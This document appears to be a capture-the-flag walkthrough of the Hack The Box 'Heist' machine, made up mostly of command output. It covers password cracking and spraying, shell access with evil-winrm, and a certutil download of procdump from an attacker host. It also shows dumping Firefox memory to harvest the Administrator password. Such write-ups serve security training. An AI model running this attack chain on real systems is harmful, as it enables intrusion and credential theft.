---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Heist



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.10.149 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 17:32 CET
Nmap scan report for 10.10.10.149
Host is up (0.061s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 114.77 seconds
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.149
	[*] Open ports: 80,135,445,5985,49669

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p80,135,445,5985,49669 10.10.10.149 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 17:48 CET
Nmap scan report for 10.10.10.149
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-24T16:49:16
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   93.28 ms 10.10.16.1
2   93.65 ms 10.10.10.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.57 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../../.gitbook/assets/4031_vmware_rN3XExMi7t.png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../../.gitbook/assets/4032_vmware_kQksVjgKIP.png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<pre class="language-bash"><code class="lang-bash">❯ hashid '$1$pdQG$o8nrSzsGXeaduXrjlvKc91'
Analyzing '$1$pdQG$o8nrSzsGXeaduXrjlvKc91'
[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 

<strong>❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
</strong>hashcat (v6.2.6) starting in autodetect mode

...[snip]...
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
</code></pre>





{% embed url="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html" %}



<figure><img src="../../../.gitbook/assets/imagen (2) (1) (1).png" alt=""><figcaption></figcaption></figure>





{% embed url="https://community.cisco.com/t5/community-ideas/cisco-password-7-decrypt/td-p/4677103" %}



a



{% embed url="https://www.ifm.net.nz/cookbooks/passwordcracker.html" %}



<figure><img src="../../../.gitbook/assets/imagen (3) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ catnp users.txt
rout3r
admin
hazard

❯ catnp passwords.txt
stealth1agent
Q4)sJu\Y8qz*A3?d
$uperP@ssword
```



```bash
❯ nxc smb 10.10.10.149 -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
```



```bash
❯ nxc smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute | grep SidTypeUser
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```



```bash
❯ nxc smb 10.10.10.149 -u users.txt -p passwords.txt --continue-on-success
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\defaultaccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\guest:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\wdagutilityaccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
...[snip]...
```



```bash
❯ nxc winrm 10.10.10.149 -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
WINRM       10.10.10.149    5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
WINRM       10.10.10.149    5985   SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)

❯ evil-winrm -i 10.10.10.149 -u 'chase' -p 'Q4)sJu\Y8qz*A3?d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> type ../Desktop/user.txt
a06465920be01601cfec7581a5022492
```



```bash
*Evil-WinRM* PS C:\Users\Chase\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    465      18     2260       5440               368   0 csrss
    290      13     2340       5224               484   1 csrss
    357      15     3508      14560              3004   1 ctfmon
    252      14     3920      13212              3852   0 dllhost
    166       9     1876       9824       0.08   4320   1 dllhost
    617      32    30136      57808               964   1 dwm
   1494      58    24076      78476              5196   1 explorer
    378      28    21912      58856       0.38   1372   1 firefox
    355      25    16400      39096       0.11   5412   1 firefox
   1075      69   139428     217192       5.83   6716   1 firefox
    347      19    10256      36936       0.08   6936   1 firefox
    401      33    31076      88420       0.91   7128   1 firefox
```



{% embed url="https://learn.microsoft.com/es-es/sysinternals/downloads/procdump" %}

```bash
❯ ls -l
.rw-rw-r-- kali kali 714 KB Fri Jan 24 18:37:44 2025  Procdump.zip
❯ unzip Procdump.zip
Archive:  Procdump.zip
  inflating: procdump.exe            
  inflating: procdump64.exe          
  inflating: procdump64a.exe         
  inflating: Eula.txt                
❯ ls -l
.rw-rw-r-- kali kali 7.3 KB Thu Nov  3 15:55:00 2022  Eula.txt
.rw-rw-r-- kali kali 773 KB Thu Nov  3 15:55:14 2022  procdump.exe
.rw-rw-r-- kali kali 714 KB Fri Jan 24 18:37:44 2025  Procdump.zip
.rw-rw-r-- kali kali 415 KB Thu Nov  3 15:55:14 2022  procdump64.exe
.rw-rw-r-- kali kali 398 KB Thu Nov  3 15:55:14 2022  procdump64a.exe

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```bash
*Evil-WinRM* PS C:\Test> certutil.exe -f -urlcache -split http://10.10.16.5/procdump64.exe
****  Online  ****
  000000  ...
  067b98
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Test> dir


    Directory: C:\Test


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/24/2025  11:10 PM         424856 procdump64.exe
```



```bash
*Evil-WinRM* PS C:\Test> .\procdump64.exe -ma 6716 -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[23:14:18] Dump 1 initiated: C:\Test\firefox.exe_250124_231418.dmp
[23:14:19] Dump 1 writing: Estimated dump file size is 498 MB.
[23:14:20] Dump 1 complete: 498 MB written in 1.1 seconds
[23:14:20] Dump count reached.

*Evil-WinRM* PS C:\Test> download firefox.exe_250124_231418.dmp
```



```bash
❯ strings firefox.exe_250124_231418.dmp | grep -iE "login_username|login_password"
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
O^privateBrowsingId=1,p,:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```



```bash
❯ nxc smb 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Administrator:4dD!5}x/re8]FBuZ (Pwn3d!)
❯ evil-winrm -i 10.10.10.149 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
ce9b4ccf9ab5f9ec056272aea4abfca3
```
